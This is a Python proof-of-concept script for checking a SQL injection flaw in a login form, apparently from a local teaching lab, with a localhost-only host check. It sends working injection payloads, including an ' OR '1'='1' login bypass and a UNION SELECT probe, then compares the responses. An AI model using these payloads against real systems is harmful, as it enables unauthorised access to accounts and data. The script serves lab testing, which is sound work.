#!/usr/bin/env python3
"""SQLI-002 SQL injection local verification draft (NOT executed).

Scope: only localhost / 127.0.0.1 / ::1 authorized teaching lab.
The entry script path is NOT part of the audited fragment; it must be
supplied by the tester from the actual deployment.

Example:
  python sqli002_poc.py --base-url http://127.0.0.1:8080 --path /<entry-script>.php --valid-user <test-user> --valid-pass <test-pass>
"""
import argparse
import http.client
import sys
import urllib.parse

ALLOWED_HOSTS = {"localhost", "127.0.0.1", "::1"}
LOGIN_MARK = "Your Login name:"
PASS_MARK = "Your Password:"
FLAG_IMG = "../images/flag.jpg"
SLAP_IMG = "../images/slap.jpg"
ERROR_HINTS = (
    "You have an error in your SQL syntax",
    "Warning: mysql",
    "supplied argument is not a valid MySQL",
)


def parse_args():
    p = argparse.ArgumentParser(description="SQLI-002 boolean/UNION SQLi draft")
    p.add_argument("--base-url", required=True,
                   help="lab base url, e.g. http://127.0.0.1:8080")
    p.add_argument("--path", required=True,
                   help="entry script path from the real deployment")
    p.add_argument("--valid-user", required=True,
                   help="dedicated test account for the baseline request")
    p.add_argument("--valid-pass", required=True)
    p.add_argument("--timeout", type=float, default=10.0)
    return p.parse_args()


def parse_target(base_url):
    u = urllib.parse.urlsplit(base_url)
    if u.scheme not in ("http", "https"):
        raise SystemExit("only http/https allowed: %r" % (base_url,))
    if u.hostname not in ALLOWED_HOSTS:
        raise SystemExit("only localhost/127.0.0.1/::1 allowed, got: %r" % (u.hostname,))
    return u


def post(base, path, data, timeout):
    conn_cls = http.client.HTTPSConnection if base.scheme == "https" else http.client.HTTPConnection
    port = base.port or (443 if base.scheme == "https" else 80)
    conn = conn_cls(base.hostname, port, timeout=timeout)
    body = urllib.parse.urlencode(data)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close",
    }
    try:
        conn.request("POST", path, body=body, headers=headers)
        resp = conn.getresponse()
        raw = resp.read()
        return resp.status, raw.decode("utf-8", "replace")
    except (OSError, http.client.HTTPException) as exc:
        return None, "REQUEST_ERROR: %r" % (exc,)
    finally:
        conn.close()


def between(text, start_mark):
    i = text.find(start_mark)
    if i < 0:
        return None
    j = i + len(start_mark)
    end = len(text)
    for mark in ("<br>", "<br/>", "<br />", "\n"):
        k = text.find(mark, j)
        if k != -1 and k < end:
            end = k
    return text[j:end].strip()


def classify(status, body):
    return {
        "status": status,
        "login_name": between(body, LOGIN_MARK),
        "login_pass": between(body, PASS_MARK),
        "flag": FLAG_IMG in body,
        "slap": SLAP_IMG in body,
        "sql_error": [h for h in ERROR_HINTS if h in body],
        "body_len": len(body),
    }


def main():
    args = parse_args()
    base = parse_target(args.base_url)
    cases = [
        ("baseline_valid", args.valid_user, args.valid_pass),
        ("negative_wrong_pass", "sqli002_probe_user", "sqli002_probe_pass"),
        ("true_condition", "' OR '1'='1' -- ", "sqli002_probe_pass"),
        ("false_condition", "' AND '1'='2' -- ", "sqli002_probe_pass"),
        ("union_probe", "' UNION SELECT 'sqli002_marker','sqli002_marker' -- ",
         "sqli002_probe_pass"),
    ]
    results = {}
    for name, user, pwd in cases:
        status, body = post(base, args.path, {"uname": user, "passwd": pwd}, args.timeout)
        res = classify(status, body)
        results[name] = res
        print("[%s] status=%s login_name=%r login_pass=%r flag=%s slap=%s sql_error=%s len=%s"
              % (name, res["status"], res["login_name"], res["login_pass"],
                 res["flag"], res["slap"], bool(res["sql_error"]), res["body_len"]))

    base_r = results["baseline_valid"]
    true_r = results["true_condition"]
    false_r = results["false_condition"]
    union_r = results["union_probe"]

    if base_r["login_name"] is None and base_r["status"] == 200:
        print("PRECONDITION: baseline produced no parsable login region; "
              "verify --valid-user/--valid-pass and --path before judging.")
    if true_r["status"] == 200 and true_r["login_name"] is not None and false_r["login_name"] is None:
        print("OBSERVATION: true condition yields a login region while false condition is empty.")
        if union_r["login_name"] == "sqli002_marker":
            print("OBSERVATION: UNION marker reflected in the login region (column count matched).")
    else:
        print("OBSERVATION: no true/false difference observed; could be escaping, "
              "column count mismatch, wrong path, or deployment differences.")
    print("NOTE: HTTP 200 or a reflected marker alone is not proof; keep raw responses as evidence.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
